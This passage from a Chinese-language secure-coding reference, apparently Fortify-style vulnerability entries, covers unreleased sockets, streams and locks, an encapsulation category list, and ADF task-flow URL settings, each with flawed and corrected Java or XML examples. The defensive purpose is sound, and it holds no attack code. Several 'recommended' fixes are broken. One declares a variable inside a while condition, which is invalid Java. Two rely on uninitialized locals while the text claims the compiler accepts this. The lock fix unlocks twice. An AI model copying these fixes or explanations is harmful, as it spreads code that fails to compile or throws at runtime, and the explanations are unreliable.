System.out.println(socketData);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-91"><a href="#RECOMMENDATIONS-91" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在 finally 代码段中释放套接字资源。例 2 中的代码可按以下方式改写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  Socket sock;</span><br><span class="line"></span><br><span class="line">  BufferedReader reader;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    sock = new Socket(host, port);</span><br><span class="line"></span><br><span class="line">    reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    while ((String socketData = reader.readLine()) != null) &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(socketData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  finally &#123;</span><br><span class="line"></span><br><span class="line">    safeClose(sock);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void safeClose(Socket s) &#123;</span><br><span class="line"></span><br><span class="line">  if (s != null &amp;&amp; !s.isClosed()) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">      s.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">      log(e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此解决方法使用了一个助手函数，用以记录在尝试关闭套接字时可能产生的异常。该助手函数大约会在需要关闭套接字时重新使用。</p>
<p>另外，echoSocket() 方法不会将 sock 套接字对象初始化为 null。而是进行检查，以确保调用 safeClose() 之前，sock 不是 null。如果没有检查 null，Java 编译器会报告 sock 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 sock 初始化为 null，那么编译器就无法检测 sock 未经初始化便使用的情况。</p>
<h5 id="REFERENCES-88"><a href="#REFERENCES-88" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[2] DOS-2: Release resources in all cases Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 404</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[10] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Streams"><a href="#Unreleased-Resource-Streams" class="headerlink" title="Unreleased Resource: Streams"></a>Unreleased Resource: Streams</h4><h5 id="ABSTRACT-90"><a href="#ABSTRACT-90" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序可能无法成功释放某一项系统资源。</p>
<h5 id="EXPLANATION-91"><a href="#EXPLANATION-91" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可能无法成功释放某一项系统资源。</p>
<p>资源泄露至少有两种常见的原因：</p>
<p>－ 错误状况及其他异常情况。</p>
<p>－ 未明确程序的哪一部份负责释放资源。</p>
<p>大部分 Unreleased Resource 问题只会导致一般的软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 denial of service 攻击。</p>
<p>示例：下面的方法绝不会关闭它所打开的文件句柄。FileInputStream 中的 finalize() 方法最终会调用 close()，但是不能确定何时会调用 finalize() 方法。在繁忙的环境中，这会导致 JVM 用尽它所有的文件句柄。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private void processFile(String fName) throws FileNotFoundException, IOException &#123;</span><br><span class="line"></span><br><span class="line">  FileInputStream fis = new FileInputStream(fName);</span><br><span class="line"></span><br><span class="line">  int sz;</span><br><span class="line"></span><br><span class="line">  byte[] byteArray = new byte[BLOCK_SIZE];</span><br><span class="line"></span><br><span class="line">  while ((sz = fis.read(byteArray)) != -1) &#123;</span><br><span class="line"></span><br><span class="line">    processBytes(byteArray, sz);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-92"><a href="#RECOMMENDATIONS-92" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><ol>
<li>请不要依赖 finalize() 回收资源。为了使对象的 finalize() 方法能被调用，垃圾收集器必须确认对象符合垃圾回收的条件。但是垃圾收集器只有在 JVM 内存过小时才会使用。因此，无法保证何时能够调用该对象的 finalize() 方法。垃圾收集器最终运行时，可能出现这样的情况，即在短时间内回收大量的资源，这种情况会导致“突发”性能，并降低总体系统通过量。随着系统负载的增加，这种影响会越来越明显。</li>
</ol>
<p>最后，如果某一资源回收操作被挂起（例如该操作需要通过网络访问数据库），那么执行 finalize() 方法的线程也将被挂起。</p>
<ol>
<li>在 finally 代码段中释放资源。示例中的代码可按以下方式改写：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">public void processFile(String fName) throws FileNotFoundException, IOException &#123;</span><br><span class="line"></span><br><span class="line">  FileInputStream fis;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    fis = new FileInputStream(fName);</span><br><span class="line"></span><br><span class="line">    int sz;</span><br><span class="line"></span><br><span class="line">    byte[] byteArray = new byte[BLOCK_SIZE];</span><br><span class="line"></span><br><span class="line">    while ((sz = fis.read(byteArray)) != -1) &#123;</span><br><span class="line"></span><br><span class="line">      processBytes(byteArray, sz);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  finally &#123;</span><br><span class="line"></span><br><span class="line">    if (fis != null) &#123;</span><br><span class="line"></span><br><span class="line">      safeClose(fis);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void safeClose(FileInputStream fis) &#123;</span><br><span class="line"></span><br><span class="line">  if (fis != null) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">      fis.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">      log(e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上方案使用了一个助手函数，用以记录在尝试关闭流时可能发生的异常。该助手函数大约会在需要关闭流时重新使用。</p>
<p>同样，processFile 方法不会将 fis 对象初始化为 null。而是进行检查，以确保调用 safeClose() 之前，fis 不是 null。如果没有检查 null，Java 编译器会报告 fis 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 fis 初始化为 null，那么编译器就无法检测 fis 未经初始化便使用的情况。</p>
<h5 id="REFERENCES-89"><a href="#REFERENCES-89" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[2] DOS-2: Release resources in all cases Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 404</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[10] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002000 CAT II, APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Synchronization"><a href="#Unreleased-Resource-Synchronization" class="headerlink" title="Unreleased Resource: Synchronization"></a>Unreleased Resource: Synchronization</h4><h5 id="ABSTRACT-91"><a href="#ABSTRACT-91" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序无法释放其持有的锁，这可能会导致死锁。</p>
<h5 id="EXPLANATION-92"><a href="#EXPLANATION-92" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可能无法成功释放某一项系统资源。</p>
<p>资源泄露至少有两种常见的原因：</p>
<p>－ 错误状况及其他异常情况。</p>
<p>－ 未明确程序的哪一部份负责释放资源。</p>
<p>大部分 Unreleased Resource 问题只会导致常规软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 denial of service 攻击。</p>
<p>例 1：下列代码在 performOperationInCriticalSection() 之前建立锁定，但是如果该方法抛出异常则该代码未能释放锁定。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ReentrantLock  myLock = new ReentrantLock ();</span><br><span class="line"></span><br><span class="line">myLock.lock();</span><br><span class="line"></span><br><span class="line">performOperationInCriticalSection();</span><br><span class="line"></span><br><span class="line">myLock.unlock();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-93"><a href="#RECOMMENDATIONS-93" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>因为资源泄漏很难追踪，所以要建立一系列资源管理模式和软件指令，并且不违反您所定制的这些规则。</p>
<p>解决本示例中错误处理错误的一个良好模式为释放 finally 块中的锁定。</p>
<p>例 2：下列代码通常会释放锁定。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ReentrantLock  myLock = new ReentrantLock ();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">myLock.lock();</span><br><span class="line"></span><br><span class="line">performOperationInCriticalSection();</span><br><span class="line"></span><br><span class="line">myLock.unlock();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finally &#123;</span><br><span class="line"></span><br><span class="line">if (myLock != null) &#123;</span><br><span class="line"></span><br><span class="line">myLock.unlock();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-90"><a href="#REFERENCES-90" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Sun Tutorial - JavaDoc - Class ReentrantLock</p>
<p>[2] CERT LCK07-J. Avoid deadlock by requesting and releasing locks in the same order</p>
<p>[3] CERT LCK08-J. Ensure actively held locks are released on exceptional conditions</p>
<p>[4] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[5] DOS-2: Release resources in all cases Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 411</p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装是指划定明确的边界。在 Web 浏览器中，这可能意味着确保您的移动代码不会被其他移动代码滥用。在服务器上，它可能意味着对经过验证的数据和未经验证的数据、一个用户的数据和另一用户的数据或对用户可以查看的数据和不能查看的数据进行区分。</p>
<p>ADF Bad Practices: Default url-invoke-disallowed Setting</p>
<p>Cross-Site Request Forgery</p>
<p>Cross-Site WebSocket Hijacking</p>
<p>File Based Cross-Zone Scripting</p>
<p>HTML5: Overly Permissive CORS Policy</p>
<p>Hidden Field</p>
<p>Insecure Storage: Android Backup Storage</p>
<p>Insecure Storage: Android External Storage</p>
<p>Insecure Storage: Android World Readable or Writeable</p>
<p>J2EE Bad Practices: Leftover Debug Code</p>
<p>JavaScript Hijacking</p>
<p>JavaScript Hijacking: Vulnerable Framework</p>
<p>Mass Assignment: Sensitive Field Exposure</p>
<p>Poor Logging Practice: Logger Not Declared Static Final</p>
<p>Poor Logging Practice: Multiple Loggers</p>
<p>Poor Logging Practice: Use of a System Output Stream</p>
<p>Poor Style: Non-final Public Static Field</p>
<p>System Information Leak</p>
<p>System Information Leak: Apache Axis</p>
<p>System Information Leak: Apache Axis 2</p>
<p>System Information Leak: External</p>
<p>System Information Leak: HTML Comment in JSP</p>
<p>System Information Leak: Incomplete Servlet Error Handling</p>
<p>System Information Leak: Internal</p>
<p>System Information Leak: Overly Broad SQL Logging</p>
<p>System Information Leak: Spring Boot Actuators Enabled</p>
<p>Trust Boundary Violation</p>
<p>Unsafe Mobile Code: Access Violation</p>
<p>Unsafe Mobile Code: Database Access</p>
<p>Unsafe Mobile Code: Inner Class</p>
<p>Unsafe Mobile Code: Public finalize() Method</p>
<p>Unsafe Mobile Code: Unsafe Array Declaration</p>
<p>Unsafe Mobile Code: Unsafe Public Field</p>
<h4 id="ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><a href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting" class="headerlink" title="ADF Bad Practices: Default url-invoke-disallowed Setting"></a>ADF Bad Practices: Default url-invoke-disallowed Setting</h4><h5 id="ABSTRACT-92"><a href="#ABSTRACT-92" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>依靠默认的隐式 url-invoke-disallowed 设置缺乏明确性，如果默认设置发生意外变更，则可能会导致出现意外行为。</p>
<h5 id="EXPLANATION-93"><a href="#EXPLANATION-93" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，Fusion 应用程序中的任务流不能直接通过 GET 请求访问：URL 在尝试调用任务流时，会收到 HTTP 403 状态代码。但是，依靠隐式设置始终缺乏明确性，如果底层的默认设置发生变更，则可能会导致出现意外行为。</p>
<p>例 1：以下片段来自任务流定义文件，显示了使用默认的隐式 url-invoke-disallowed 设置配置的任务流示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-94"><a href="#RECOMMENDATIONS-94" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最好通过在任务流定义文件中指定 url-invoke-disallowed 标签来显式配置此设置。显式配置此配置可以避免混乱，表明选择此设置值的明确目的。如果底层隐式设置的默认值发生变更，还可以避免可能出现的意外行为。</p>
<p>例 2：以下片段来自任务流定义文件，显示了与上文相同的使用显式 url-invoke-disallowed 设置配置的任务流示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;visibility id=&quot;__1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;url-invoke-disallowed/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/visibility&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在极少数情况下必须通过 URL 才能访问任务流，此时可以使用 url-invoke-allowed 设置。</p>
<p>例 3：以下片段显示了使用 url-invoke-allowed 设置配置的同一个任务流。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;visibility id=&quot;__1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;url-invoke-allowed/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/visibility&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-91"><a href="#REFERENCES-91" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oracle(R) Fusion Middleware Fusion Developer’s Guide for Oracle Application Development Framework, 15.6.4.How to Call a Bounded Task Flow Using a URL</p>
<p>[2] Standards Mapping - FIPS200 CM</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><a href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field" class="headerlink" title="Android Bad Practices: Encryption Secret Held in Static Field"></a>Android Bad Practices: Encryption Secret Held in Static Field</h4><h5 id="ABSTRACT-93"><a href="#ABSTRACT-93" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序将加密密钥保留在静态类字段中，使攻击者可轻松进行恢复。</p>
<h5 id="EXPLANATION-94"><a href="#EXPLANATION-94" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将加密密钥存储在静态类字段中时，可访问进程内存（如经过 root 的设备）或进程内存转储（如故障转储）的实体可轻松恢复该密钥。</p>
